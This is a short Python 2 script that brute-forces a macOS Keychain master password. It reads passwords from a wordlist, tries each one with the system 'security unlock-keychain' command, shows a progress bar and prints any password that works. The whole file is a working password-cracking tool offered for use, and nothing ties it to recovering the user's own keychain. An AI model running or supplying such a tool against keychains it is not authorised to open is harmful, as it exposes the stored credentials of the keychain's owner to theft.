#!/usr/bin/env python2

import subprocess
import argparse
import progress
import sys

def try_password(keychain, pwd):
    try:
        subprocess.check_output(['/usr/bin/security', 'unlock-keychain', '-p', pwd, keychain])
        return True
    except subprocess.CalledProcessError:
        return False

def main(args):
    count = 0
    with open(args.wordlist) as f:
        for _ in f:
            count += 1

    i = 0
    bar = progress.ProgressMeter(count)
    with open(args.wordlist) as f:
        for pwd in f:
            pwd = pwd.strip()

            if try_password(args.keychain, pwd):
                print '\n\nfound password: %s' % pwd
                break

            bar.nextItem()
            
            i += 1
            if i >= 127:
                i = 0
                sys.stdout.write('\r%s %s    ' % (bar, pwd))
                sys.stdout.flush()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Bruteforce Keychain master passwords.')
    parser.add_argument('-w', '--wordlist', required=True, dest='wordlist',
        help='Take wordlist from this file')
    parser.add_argument('keychain', nargs='?', default='login.keychain',
        help='the chain to unlock [login.keychain]')
    main(parser.parse_args())
